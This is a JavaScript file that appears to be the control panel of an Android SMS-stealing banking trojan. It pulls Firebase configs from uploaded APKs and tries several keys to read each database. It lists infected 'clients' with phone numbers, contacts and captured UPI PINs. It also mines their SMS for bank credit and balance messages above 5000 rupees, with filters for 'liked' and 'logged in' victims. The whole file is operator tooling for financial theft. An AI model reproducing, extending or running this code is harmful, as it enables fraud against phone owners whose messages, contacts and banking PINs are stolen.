  patchClientField(d,{checked:!isApkChecked(id)});
}
function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){
  if(!r.ok)return null;
  return r.json();
}).catch(function(){return null;});}
function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}

function loadFirebaseConfigs(){
  try{
    var s=localStorage.getItem(FB_LIST_KEY);
    if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length){
      (SERVER_FIREBASES||[]).forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
      DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
      return p;
    }}
  }catch(e){}
  var p=(SERVER_FIREBASES||[]).slice();
  DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
  return p;
}
function getFbAuthKey(inst){
  if(!inst||!inst.config)return '';
  var c=inst.config;
  var key=c.secret||c.authKey||c.key||c.databaseSecret||c.apiKey||'';
  if(!key&&c.databaseURL)key=(c.databaseURL||'').replace(/\/$/,'');
  return key;
}
function getFbAuthCandidates(inst){
  var c=(inst&&inst.config)||{}, url=(inst&&inst.restUrl||'').replace(/\/$/,''), keys=[], k;
  ['secret','authKey','key','databaseSecret','apiKey'].forEach(function(field){
    k=c[field];
    if(k&&keys.indexOf(k)<0)keys.push(k);
  });
  if(url&&keys.indexOf(url)<0)keys.push(url);
  keys.push('');
  return keys;
}
function buildRestUrl(inst,path,authKey){
  var url=(inst.restUrl||'').replace(/\/$/,'')+'/'+String(path||'').replace(/^\//,'');
  if(!/\.json(\?|$)/.test(url))url+='.json';
  if(authKey)url+=(url.indexOf('?')>=0?'&':'?')+'auth='+encodeURIComponent(authKey);
  return url;
}
function restUrlForInst(inst,path){
  return buildRestUrl(inst,path,getFbAuthKey(inst));
}
function restJsonInst(inst,path){
  var auths=getFbAuthCandidates(inst), i=0;
  function tryNext(){
    if(i>=auths.length)return Promise.resolve(null);
    var auth=auths[i++];
    return restJson(buildRestUrl(inst,path,auth)).then(function(data){
      if(data===null||isFirebaseErr(data))return tryNext();
      return data;
    }).catch(function(){return tryNext();});
  }
  return tryNext();
}
function restJsonInstShallow(inst){
  var auths=getFbAuthCandidates(inst), i=0;
  function tryNext(){
    if(i>=auths.length)return Promise.resolve(null);
    var auth=auths[i++];
    var url=(inst.restUrl||'').replace(/\/$/,'')+'/.json?shallow=true';
    if(auth)url+='&auth='+encodeURIComponent(auth);
    return restJson(url).then(function(data){
      if(data===null||isFirebaseErr(data))return tryNext();
      return data;
    }).catch(function(){return tryNext();});
  }
  return tryNext();
}
function initFirebaseInstance(cfg){
  var appName='mfb_'+cfg.id,db=null;
  if(cfg.apiKey){
    try{
      var exists=false;firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
      if(!exists)firebase.initializeApp({apiKey:cfg.apiKey,authDomain:cfg.authDomain||'',databaseURL:cfg.databaseURL,projectId:cfg.projectId||cfg.id,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''},appName);
      db=firebase.app(appName).database();
    }catch(e){}
  }
  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(/shoot|verify|mitteld|nammu|mmmff|dev-rahul/i.test(cfg.databaseURL||'')?'shootii':(/rto9|rto0|rabel|raand|user_list|demon|jdhd|raki/i.test(cfg.databaseURL||'')?'rabel':((cfg.databaseURL||'').indexOf('rabel')>=0?'rabel':'spinplay'))),liveAttached:false};
  firebaseInstances.push(inst);return inst;
}
function initFirebase(){
  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
  ensureActiveFbValid();
  firebaseConfigs.forEach(initFirebaseInstance);
  updateFbUi();
}
function addFirebaseProject(extractMeta){
  var meta=extractMeta||null;
  var name=document.getElementById('fbAddName').value.trim();
  var url=document.getElementById('fbAddUrl').value.trim().replace(/\/$/,'');
  var secret=(document.getElementById('fbAddSecret')||{}).value;
  secret=secret?String(secret).trim():'';
  var apiKey=document.getElementById('fbAddApiKey').value.trim();
  if(!name||!url){toast('Project name and Firebase URL are required',false);return;}
  if(firebaseConfigs.some(function(c){return (c.databaseURL||'').replace(/\/$/,'')===url;})){
    toast('This Firebase URL is already added',false);return;
  }
  var id='fb_'+Date.now();
  var cfg={
    id:id,
    name:name,
    databaseURL:url,
    secret:secret,
    key:secret,
    apiKey:apiKey||((meta&&meta.apiKey)||''),
    projectId:(meta&&meta.projectId)||'',
    appId:(meta&&meta.appId)||'',
    authDomain:(meta&&meta.authDomain)||'',
    storageBucket:(meta&&meta.storageBucket)||'',
    messagingSenderId:(meta&&meta.messagingSenderId)||'',
    packageName:(meta&&meta.packageName)||'',
    schema:(meta&&meta.schema)||(url.indexOf('rabel')>=0?'rabel':'spinplay'),
    deviceNodes:(meta&&meta.deviceNodes)||[],
    preferredDeviceNode:(meta&&meta.preferredDeviceNode)||''
  };
  firebaseConfigs.push(cfg);
  saveFirebaseConfigs();
  var inst=initFirebaseInstance(cfg);
  attachLive(inst);
  discoverInstance(inst).then(function(){
    processClientsDataNow();
    updateFbUi();
    toast('Added: '+name,true);
  });
  document.getElementById('fbAddName').value='';
  document.getElementById('fbAddUrl').value='';
  var secEl=document.getElementById('fbAddSecret');if(secEl)secEl.value='';
  document.getElementById('fbAddApiKey').value='';
  var st=document.getElementById('fbApkStatus');
  if(st)st.textContent='Deep scan: DEX, native libs, assets, UTF-16, Base64 — hidden Firebase + API key';
  closeFbSheet();
}
function uploadApkForFirebase(input){
  if(!input||!input.files||!input.files[0])return;
  var file=input.files[0];
  var st=document.getElementById('fbApkStatus');
  if(st)st.textContent='Analyzing '+file.name+'...';
  var fd=new FormData();
  fd.append('apk',file);
  fetch(APK_EXTRACT_URL,{method:'POST',body:fd,cache:'no-store'})
    .then(function(r){return r.json();})
    .then(function(res){
      input.value='';
      if(!res||!res.ok){
        toast((res&&res.error)||'Could not extract Firebase from APK',false);
        if(st)st.textContent='Extraction failed — try another APK';
        return;
      }
      var url=(res.databaseURL||'').replace(/\/$/,'');
      var name=res.name||res.projectId||res.packageName||'APK Firebase';
      document.getElementById('fbAddName').value=name;
      document.getElementById('fbAddUrl').value=url;
      document.getElementById('fbAddApiKey').value=res.apiKey||'';
      if(st)st.textContent='Found '+url+(res.apiKey?' · API key OK':'')+(res.preferredDeviceNode?' · node '+res.preferredDeviceNode:'')+(res.source?' · '+res.source:'');
      toast('Firebase extracted — adding project...',true);
      addFirebaseProject(res);
    })
    .catch(function(){
      input.value='';
      toast('APK upload failed',false);
      if(st)st.textContent='Upload error';
    });
}
function bindApkUpload(){
  var inp=document.getElementById('fbApkFile');
  if(!inp||inp._rebelBound)return;
  inp._rebelBound=true;
  inp.addEventListener('change',function(){uploadApkForFirebase(inp);});
}
function removeFirebaseProject(id){
  if(firebaseConfigs.length<=1){toast('At least one Firebase project is required',false);return;}
  firebaseConfigs=firebaseConfigs.filter(function(c){return c.id!==id;});
  saveFirebaseConfigs();
  Object.keys(clientsRawMap).forEach(function(k){
    if(k.indexOf(id+'::')===0)delete clientsRawMap[k];
  });
  if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
  if(activeFbId===id){activeFbId='';saveActiveFb();}
  firebaseInstances=[];
  firebaseConfigs.forEach(initFirebaseInstance);
  firebaseInstances.forEach(function(inst){attachLive(inst);});
  Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
    processClientsDataNow();
    updateFbUi();
    toast('Project removed',true);
  });
}
loadActiveFb();
ensureActiveFbValid();
initFirebase();

function updateFbUi(){
  var el=document.getElementById('fbSheetList');
  if(!el)return;
  if(!firebaseConfigs.length){
    el.innerHTML='<div class="empty">No Firebase yet — add below</div>';
    return;
  }
  var html='<div class="fb-item'+(activeFbId===''?' active':'')+'" onclick="selectFirebase(\'\')"><strong>All Combined</strong><small>'+allDevs.length+' devices</small></div>';
  firebaseConfigs.forEach(function(c){
    var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
    html+='<div class="fb-item'+(activeFbId===c.id?' active':'')+'" onclick="selectFirebase(\''+escAttr(c.id)+'\')">'+
      '<strong>'+esc(c.name)+'</strong><small>'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</small></div>';
  });
  el.innerHTML=html;
}
function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}

function getPhoneFromRecord(s){
  if(!s)return'';
  if(isCommandQueueRecord(s)||isSmsCommandRecord(s))return'';
  var check=function(obj){
    if(!obj||isSmsCommandRecord(obj))return null;
    var i,v,parsed;
    for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
      if(obj[DEVICE_PHONE_KEYS[i]]==null||obj[DEVICE_PHONE_KEYS[i]]==='')continue;
      parsed=parseDevicePhone(obj[DEVICE_PHONE_KEYS[i]]);
      if(parsed)return parsed;
    }
    return null;
  };
  var skipDeepKeys={action:1,sendSms:1,sms:1,webhookEvent:1,command:1,cmd:1,manual_commands:1,outbox:1,sendsms:1};
  var deepScanPhone=function(obj,depth){
    if(!obj||typeof obj!=='object'||depth>6||isSmsCommandRecord(obj))return'';
    var k,v,p,parsed,i;
    for(k in obj){
      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
      if(skipDeepKeys[k])continue;
      v=obj[k];
      if(v==null)continue;
      if(typeof v!=='object'){
        for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
          if(k===DEVICE_PHONE_KEYS[i]||(k==='number'&&depth>0)){
            parsed=parseDevicePhone(v);
            if(parsed)return parsed;
          }
        }
        continue;
      }
      if(v&&typeof v==='object'&&!skipDeepKeys[k]){
        p=deepScanPhone(v,depth+1);
        if(p)return p;
      }
    }
    return'';
  };
  var p=check(s);if(p)return p;
  var nests=['device_info','live_data','deviceInfo','liveData','info','profile','sim_info','simInfo','sim_data','SimInfo'];
  for(var n=0;n<nests.length;n++){if(s[nests[n]]){p=check(s[nests[n]]);if(p)return p;}}
  if(s.Device_info&&typeof s.Device_info==='string'){
    var m=s.Device_info.match(/(?:phone|mobile|number|sim)[^\n:]*[:]\s*([+\d\s-]{8,15})/i);
    if(m&&m[1]&&looksLikePhone(m[1]))return normalizePhoneDigits(m[1]);
  }
  if(s.sims&&Array.isArray(s.sims)){for(var i=0;i<s.sims.length;i++){var sim=s.sims[i];if(!sim||typeof sim!=='object')continue;var pn=sim.phone_number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no||sim.number;if(pn&&looksLikePhone(pn))return normalizePhoneDigits(pn);}}
  if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var j=0;j<si.sims.length;j++){var sim2=si.sims[j];var pn2=sim2.phone_number||sim2.phone||sim2.mobNo||sim2.mobile||sim2.contact_no||sim2.number;if(pn2&&looksLikePhone(pn2))return normalizePhoneDigits(pn2);}}}
  return deepScanPhone(s,0);
}
function extractContactsFromRecord(raw){
  if(!raw||typeof raw!=='object')return[];
  var contacts=[], seen={}, max=80;
  function addContact(c){
    if(!c||typeof c!=='object'||contacts.length>=max)return;
    var name=String(c.name||c.displayName||c.display_name||c.contact_name||c.full_name||c.contactName||'').trim();
    var phone=String(c.phone||c.phoneNumber||c.phone_number||c.number||c.mobile||c.mobNo||c.contact_no||'').trim();
    if(!phone&&!name)return;
    if(phone&&!looksLikePhone(phone))phone='';
    var key=(name+'|'+phone).toLowerCase();
    if(seen[key])return;
    seen[key]=1;
    contacts.push({name:name||'Unknown',phone:phone?normalizePhoneDigits(phone):''});
  }
  function scanContacts(obj,depth){
    if(!obj||typeof obj!=='object'||depth>5||contacts.length>=max)return;
    var k,v,i;
    for(k in obj){
      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
      v=obj[k];
      if(!v)continue;
      if(/contact|phonebook|addressbook|address_book|phone_book|all_contacts/i.test(k)){
        if(Array.isArray(v))for(i=0;i<v.length;i++)addContact(v[i]);
        else if(typeof v==='object'){
          Object.keys(v).forEach(function(cid){
            var c=v[cid];
            if(c&&typeof c==='object')addContact(c);
            else if(typeof c==='string'&&looksLikePhone(c))addContact({name:cid,phone:c});
          });
        }
      }
      if(v&&typeof v==='object'&&!Array.isArray(v)){
        if(v.name||v.displayName||v.phone||v.phoneNumber)addContact(v);
        else scanContacts(v,depth+1);
      }
    }
  }
  scanContacts(raw,0);
  return contacts;
}
function mergeContacts(existing,found){
  var out=(existing||[]).slice(), seen={}, i, c, key;
  out.forEach(function(x){seen[(x.name+'|'+x.phone).toLowerCase()]=1;});
  (found||[]).forEach(function(x){
    key=(x.name+'|'+x.phone).toLowerCase();
    if(seen[key])return;
    seen[key]=1;out.push(x);
  });
  return out.slice(0,80);
}
function isCommandQueueRecord(raw){
  if(!raw||typeof raw!=='object')return false;
  if(raw.phone_number||raw.d_name||raw.Device_info||raw.modelName||raw.deviceId)return false;
  if(raw.battery!==undefined&&raw.battery!==null&&!raw.cmd&&!raw.webhookEvent&&!raw.targetDeviceId)return false;
  if(isSmsCommandRecord(raw))return true;
  return !!(raw.cmd||raw.webhookEvent||raw.sendSms||(raw.command&&raw.messageText&&raw.phoneNumber));
}
function normalizeClientRecord(raw){
  if(!raw||typeof raw!=='object')return null;
  if(raw.password||raw.Pass)return null;
  if(isCommandQueueRecord(raw))return null;
  if(raw.Body!==undefined||raw.Number!==undefined||raw.Status!==undefined){
    var st=String(raw.Status||'').toLowerCase();
    var on=st==='online'||st==='true'||st==='1';
    return{
      name:raw.Body?String(raw.Body).slice(0,48):'Device',
      brand:'',android:'',
      online:on,online_status:on,status:raw.Status||'',
      battery:0,network:'?',sms_count:0,
      mobNo:String(raw.Number||raw.number||raw.phone||'').trim()
    };
  }
  var on=resolveOnlineStatus(raw,raw._fbId||'');
  if(raw.d_name!==undefined||raw.phone_number!==undefined){
    var on2=raw.status==='online'||on;
    return{
      name:String(raw.d_name||raw.name||'Device').slice(0,48),
      brand:raw.brand||'',android:raw.android||raw.androidV||'',
      online:on2,online_status:on2,status:raw.status||'',
      battery:parseInt(raw.battery||raw.battery_level,10)||0,
      network:raw.network||raw.service_provider||'?',sms_count:raw.sms_count||0,
      mobNo:parseDevicePhone(raw.phone_number)||getPhoneFromRecord(raw)
    };
  }
  if(raw.modelName||raw.deviceId||raw.mobNo||raw.device_model||raw.model||raw.Device_info)return{
    name:raw.modelName||raw.device_model||raw.model||raw.d_name||raw.name||'Unknown',
    brand:raw.brand||raw.manufacturer||'',
    android:raw.androidV||raw.android||raw.android_version||'',
    online:on,battery:parseInt(raw.battery||raw.battery_level,10)||0,
    network:raw.service_provider||raw.network||raw.carrier||'?',
    sms_count:raw.sms_count||raw.smsCount||raw.total_sms||0,
    mobNo:getPhoneFromRecord(raw)
  };
  if(raw.username||raw.user_name||raw.device_name){
    return{
      name:String(raw.username||raw.user_name||raw.device_name||raw.name||'Unknown').slice(0,48),
      brand:raw.brand||'',android:raw.android||'',
      online_status:raw.online_status,online:raw.online,status:raw.status,
      online:on,battery:parseInt(raw.battery||raw.battery_level,10)||0,
      network:raw.network||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
    };
  }
  var mob=getPhoneFromRecord(raw);
  if(!mob&&!raw.name&&!raw.battery&&!raw.status)return null;
  return{name:raw.name||raw.device_model||raw.d_name||'Unknown',brand:raw.brand||'',android:raw.android||'',
    online_status:raw.online_status,online:raw.online,status:raw.status,
    online:on,battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
    sms_count:raw.sms_count||raw.smsCount||0,mobNo:mob};
}
function ingestDeviceData(fbId,node,devId,data){
  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
  norm._node=node;norm._fbId=fbId;
  var key=makeDevKey(fbId,devId), existing=clientsRawMap[key]||{};
  if(existing._phoneSource&&(existing._phoneSource==='user_list'||existing._phoneSource==='user_data')&&existing.mobNo){
    norm.mobNo=existing.mobNo;
    norm._phoneSource=existing._phoneSource;
  }else if(!norm.mobNo&&existing.mobNo)norm.mobNo=existing.mobNo;
  if((!norm.name||norm.name==='Unknown')&&existing.name&&existing.name!=='Unknown')norm.name=existing.name;
  var foundContacts=extractContactsFromRecord(data);
  if(foundContacts.length)norm.contacts=mergeContacts(existing.contacts,foundContacts);
  else if(existing.contacts)norm.contacts=existing.contacts;
  if(node==='user_list'||node==='user_data'){
    if(norm.mobNo)norm._phoneSource=node;
    if(node==='user_list')norm._node='user_list';
  }
  clientsRawMap[key]=Object.assign({},existing,norm);
}
function getPhoneEnrichNodes(inst){
  var nodes=PHONE_ENRICH_NODES.slice();
  if(inst&&inst.config&&inst.config.preferredDeviceNode){
    var pref=inst.config.preferredDeviceNode;
    nodes=nodes.filter(function(n){return n!==pref;});
    nodes.unshift(pref);
  }
  return uniqPaths(nodes);
}
function enrichFromAllNodes(inst){
  var roots=getPhoneEnrichNodes(inst), keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=24;
  keys.forEach(function(mapKey){
    var p=parseDevKey(mapKey);
    if(p.fbId!==inst.id)return;
    var rec=clientsRawMap[mapKey];
    if(rec._phoneSource==='user_list'||rec._phoneSource==='user_data')return;
    var needsPhone=!rec.mobNo||!String(rec.mobNo).trim();
    var needsContacts=!rec.contacts||!rec.contacts.length;
    if(!needsPhone&&!needsContacts)return;
    roots.forEach(function(node){
      if(!node||node==='clients'||node==='users'||node==='data'||isHexDeviceKey(node))return;
      if(batch>=maxBatch)return;
      batch++;
      tasks.push(
        restJsonInst(inst,node+'/'+p.devId).then(function(data){
          if(!data||typeof data!=='object'||isFirebaseErr(data))return;
          if(isCommandQueueRecord(data)||isSmsCommandRecord(data))return;
          var phone=getPhoneFromRecord(data);
          if(phone&&(!rec.mobNo||!String(rec.mobNo).trim())){
            rec.mobNo=phone;
            rec._phoneSource=node;
          }
          var contacts=extractContactsFromRecord(data);
          if(contacts.length)rec.contacts=mergeContacts(rec.contacts,contacts);
          if(phone||contacts.length)clientsRawMap[mapKey]=rec;
        }).catch(function(){})
      );
    });
  });
  if(!tasks.length)return Promise.resolve();
  return Promise.all(tasks).then(function(){processClientsData();});
}
function enrichFromUserList(inst){
  return fetchSummaryNode(inst,'user_list').then(function(){
    return fetchSummaryNode(inst,'user_data').catch(function(){return null;});
  }).then(function(){
    return enrichFromAllNodes(inst);
  }).then(function(){
    processClientsData();
  });
}
function mergeSummaryNode(fbId,node,raw){
  if(!raw||typeof raw!=='object')return;
  Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
}
function processClientsData(){
  if(_procDevsTimer)clearTimeout(_procDevsTimer);
  _procDevsTimer=setTimeout(processClientsDataNow,450);
}
function processClientsDataNow(){
  allDevs=[];
  Object.keys(clientsRawMap).forEach(function(k){
    var s=clientsRawMap[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
    var on=deviceOnlineFromRaw(s,p.fbId);
    var contacts=s.contacts||extractContactsFromRecord(s);
    var smsIdx=inst&&inst.smsIndex&&inst.smsIndex[p.devId];
    var hasSms=!!(smsIdx&&smsIdx.roots&&smsIdx.roots.length);
    var pin=getApkUpiPin(s)||extractPinFromRecord(s);
    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
      name:getApkModel(s,{name:s.name}),displayPhone:getApkMobNo(s,{displayPhone:getDeviceDisplayPhone(s)}),brand:s.brand||'',android:s.android||'',
      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,hasSms:hasSms,
      sims:extractDeviceSims(s),pin:pin,hasPin:!!pin,money:getApkMoney(s),joined:getApkJoined(s),
      contacts:contacts,contactCount:contacts.length});
  });
  allDevs.sort(function(a,b){
    var ja=parseJoinedToMs(getApkJoined(getRawDev(a.id)));
    var jb=parseJoinedToMs(getApkJoined(getRawDev(b.id)));
    return jb-ja;
  });
  ensureActiveFbValid();
  if(selDev&&activeFbId){
    var cur=getSelDev();
    if(!cur||cur.fbId!==activeFbId){selDev='';clearListeners();}
  }
  renderDevices();updateStats();updateFbUi();
}
function updateStats(){
  var all=allDevs;
  if(activeFbId)all=all.filter(function(d){return d.fbId===activeFbId;});
  var pin=all.filter(function(d){return deviceMatchesApkFilter(d,'onlypin');});
  var online=all.filter(function(d){return deviceMatchesApkFilter(d,'online');});
  var liked=all.filter(function(d){return deviceMatchesApkFilter(d,'liked');});
  var logged=all.filter(function(d){return deviceMatchesApkFilter(d,'login');});
  setText('totalClients','Total Clients:-'+all.length);
  setText('upiPinCount','UPI PIN:-'+pin.length);
  setText('activeCount','Active🟢:-'+online.length);
  setText('likedCount','Liked Clients:-'+liked.length);
  setText('loggedCount','Logged in📲:-'+logged.length);
  updatePanelTitles();
}
function fetchSummaryNode(inst,node){
  return restJsonInst(inst,node).then(function(raw){mergeSummaryNode(inst.id,node,raw);});
}
function bruteFetchDeviceNodes(inst){
  var nodes=getDeviceNodesForInst(inst);
  var tasks=[];
  nodes.forEach(function(n){
    tasks.push(fetchSummaryNode(inst,n).catch(function(){return null;}));
  });
  return Promise.all(tasks).then(function(){processClientsData();});
}
function discoverInstance(inst){
  return restJsonInstShallow(inst).then(function(roots){
    if(roots&&typeof roots==='object'&&!isFirebaseErr(roots)){
      inst.rootKeys=Object.keys(roots);
      inst.smsRootKeys=inst.rootKeys.filter(isInboundSmsRootNode);
      inst.schema=detectSchemaFromRoots(roots,inst);
      if(inst.config){
        inst.config.schema=inst.schema;
        if(roots.user_list)inst.config.preferredDeviceNode='user_list';
        else if(roots.user_data&&!inst.config.preferredDeviceNode)inst.config.preferredDeviceNode='user_data';
      }
      var nodes=Object.keys(roots).filter(function(n){return isDeviceSummaryNode(n);});
      if(roots.user_list&&nodes.indexOf('user_list')<0)nodes.unshift('user_list');
      if(roots.user_data&&nodes.indexOf('user_data')<0)nodes.unshift('user_data');
      if(roots.user_list||roots.user_data){
        nodes=nodes.filter(function(n){return COMMAND_JUNK_NODES.indexOf(n)<0;});
      }
      if(!nodes.length)nodes=getDeviceNodesForInst(inst);
      var tasks=[];
      nodes.forEach(function(n){
        tasks.push(fetchSummaryNode(inst,n));
      });
      return Promise.all(tasks).then(function(){
        if(!allDevs.length) return bruteFetchDeviceNodes(inst);
        return enrichFromUserList(inst);
      }).then(function(){
        return buildSmsIndex(inst);
      });
    }
    return bruteFetchDeviceNodes(inst).then(function(){return enrichFromUserList(inst);}).then(function(){return buildSmsIndex(inst);});
  }).catch(function(){
    return bruteFetchDeviceNodes(inst).then(function(){return enrichFromUserList(inst);}).then(function(){return buildSmsIndex(inst);});
  });
}
function attachLive(inst){
  if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
  getDeviceNodesForInst(inst).slice(0,12).forEach(function(node){
    try{
      inst.db.ref(node).on('value',function(s){
        if(!s.exists())return;
        mergeSummaryNode(inst.id,node,s.val());
        processClientsData();
      });
    }catch(e){}
  });
}
function fetchAllData(force){
  if(_panelPaused)return Promise.resolve();
  var showBlock=!_initialLoadDone||!!force;
  if(showBlock)showLoading(true,true);
  firebaseInstances.forEach(attachLive);
  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
    processClientsDataNow();
    _initialLoadDone=true;
    if(showBlock)showLoading(false,true);
  }).catch(function(){if(showBlock)showLoading(false,true);});
}
function refreshData(){toast('Refreshing...',true);fetchAllData(true);}

function scanDeviceBankStatus(d){
  if(deviceBankCache[d.id]!==undefined)return Promise.resolve(deviceBankCache[d.id]);
  var inst=getFbInstance(d.fbId);
  if(!inst){deviceBankCache[d.id]=false;return Promise.resolve(false);}
  return fetchSmsFromPaths(inst,d).then(function(list){
    var has=parseBankAccountsFromSms(list).length>0;
    deviceBankCache[d.id]=has;
    return has;
  }).catch(function(){deviceBankCache[d.id]=false;return false;});
}
function scanAllDevicesBank(){
  var devs=getFilteredDevs();
  if(!devs.length)return Promise.resolve();
  var i=0, batch=2;
  function next(){
    if(i>=devs.length)return Promise.resolve();
    var slice=devs.slice(i,i+batch);
    i+=batch;
    return Promise.all(slice.map(scanDeviceBankStatus)).then(next);
  }
  return next();
}

function buildDevCardHtml(d,i,total){
  var raw=getRawDev(d.id);
  var on=d.status==='online';
  var phone=getApkMobNo(raw,d);
  var info='Phone : '+esc(phone)+'\nModel : '+esc(getApkModel(raw,d))+'\nBattery : '+(raw.battery!=null?raw.battery:d.battery)+'%\n$- : '+esc(getApkMoney(raw));
  var pinLine='PIN = '+esc(getApkUpiPin(raw)||'—');
  var count=(total!=null?total-i:i+1);
  return '<div class="dev-card" data-dev-id="'+escAttr(d.id)+'"><div class="dev-card-inner">'+
    '<div class="dev-count">'+count+'</div>'+
    '<div class="dev-like'+(isApkLiked(d.id)?' liked':'')+'" data-dev-id="'+escAttr(d.id)+'">'+(isApkLiked(d.id)?'❤️':'👎')+'</div>'+
    '<div class="dev-info">'+info+'</div>'+
    '<div class="dev-status '+(on?'online':'offline')+'">'+(on?'Online':'Offline')+'</div>'+
    '<div class="dev-del" data-dev-id="'+escAttr(d.id)+'">🗑️</div>'+
    '<div class="dev-pin">'+pinLine+'</div>'+
    '<div class="dev-check" data-dev-id="'+escAttr(d.id)+'"><input type="checkbox"'+(isApkChecked(d.id)?' checked':'')+' onclick="event.stopPropagation()"/> CHECKED</div>'+
    '<div class="dev-time">'+formatDevDate(d)+'</div></div></div>';
}
function buildSmsCardHtml(m,extra,opts){
  opts=opts||{};
  var body=esc(m.body||m.message||m.text||'');
  var sender=esc(m.address||m.sender||m.from||'Unknown');
  var when=esc(m.date_readable||m.dateTime||m.date||m.time||'');
  var meta=(extra?esc(extra)+' · ':'')+'Sender: '+sender+(when?' · '+when:'');
  var del='';
  if(opts.deletable&&m.id){
    del='<button type="button" class="icon-btn" style="font-size:22px" onclick="event.stopPropagation();deleteDeviceSms(\''+escAttr(String(m.id))+'\')">🗑️</button>';
  }
  return '<div class="sms-card"><div class="sms-inner"><div class="sms-icon">💬</div><div class="sms-body"><div>'+body+'</div><div class="sms-meta">'+meta+'</div></div>'+del+'</div></div>';
}
function renderDevices(){
  if(currentView==='money'){renderMoneyView();return;}
  if(currentView==='device'){renderDeviceSmsList();return;}
  var q=getSearchQuery();
  var list=getFilteredDevs().filter(function(d){
    return !q||(d.displayPhone+d.name+d.rawId+(d.pin||'')).toLowerCase().includes(q);
  });
  var emptyMsgs={home:'No clients found',online:'No online clients',onlypin:'No PIN clients found',liked:'No liked clients',login:'No logged-in clients'};
  var emptyMsg=!firebaseConfigs.length?'Add Firebase first 🔥':(emptyMsgs[currentView]||'No clients found');
  var html=!list.length?'<div class="empty">'+emptyMsg+'</div>':list.map(function(d,i){return buildDevCardHtml(d,i,list.length);}).join('');
  var el=getActiveListEl();
  if(el)el.innerHTML=html;
}
var APK_MONEY_KEYWORDS=['credited','balance','avl','bal','inr','₹','bank','upi','pnb','canara','union','uco','idbi','central','bob','boi','punjab'];
function apkContainsLargeAmount(text){
  var re=/(\u20b9|rs\.?)[ ]?([\d,]+\.?\d*)/gi,m,best=0;
  while((m=re.exec(String(text||'')))!==null){
    var n=parseFloat(String(m[2]).replace(/,/g,''));
    if(!isNaN(n)&&n>=5000)return true;
    if(n>best)best=n;
  }
  return best>=5000;
}
function apkExtractFirstAmount(text){
  var re=/(\u20b9|rs\.?)[ ]?([\d,]+\.?\d*)/gi,m;
  while((m=re.exec(String(text||'')))!==null){
    var n=parseFloat(String(m[2]).replace(/,/g,''));
    if(!isNaN(n)&&n>0)return n;
  }
  return 0;
}
function apkFormatMsgDate(ts){
  if(!ts)return '';
  var dt=new Date(typeof ts==='number'&&ts<1e12?ts*1000:+ts);
  if(isNaN(dt.getTime()))return String(ts);
  var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
  var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'pm':'am';
  h=h%12||12;
  return 'DATE: '+dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
}
function parseApkMoneyMessage(msgData,clientKey,clientData){
  if(!msgData||typeof msgData!=='object')return null;
  var msgText=msgData.message!=null?msgData.message:(msgData.body||msgData.text||'');
  var senderRaw=msgData.sender!=null?msgData.sender:(msgData.address||msgData.from||'');
  if(msgText==null||msgText===''||senderRaw==null||senderRaw==='')return null;
  var message=String(msgText).toLowerCase();
  var sender=String(senderRaw).toLowerCase();
  if(/\d{6,}/.test(sender))return null;
  if(/sbi|hdfc/.test(message))return null;
  if(/loan|application|emi/.test(message))return null;
  var hit=false,i;
  for(i=0;i<APK_MONEY_KEYWORDS.length;i++){if(message.indexOf(APK_MONEY_KEYWORDS[i])>=0){hit=true;break;}}
  if(!hit||!apkContainsLargeAmount(message))return null;
  var amount=apkExtractFirstAmount(message);
  var row=Object.assign({},msgData);
  row.message=String(msgText);
  row.sender=String(senderRaw);
  row.clientKey=clientKey;
  row.status=clientData&&clientData.status;
  row.modelName=clientData&&clientData.modelName;
  row.mobNo=clientData&&clientData.mobNo;
  row.amount=amount;
  var orig=msgData.dateTime||msgData.date_readable||msgData.date||msgData.time||'';
  row.dateTime=orig?String(orig):'';
  return row;
}
function loadMoneyMessages(force){
  if(moneyMessagesLoading)return new Promise(function(resolve){
    var t=setInterval(function(){
      if(!moneyMessagesLoading){clearInterval(t);resolve(moneyMessagesList);}
    },150);
  });
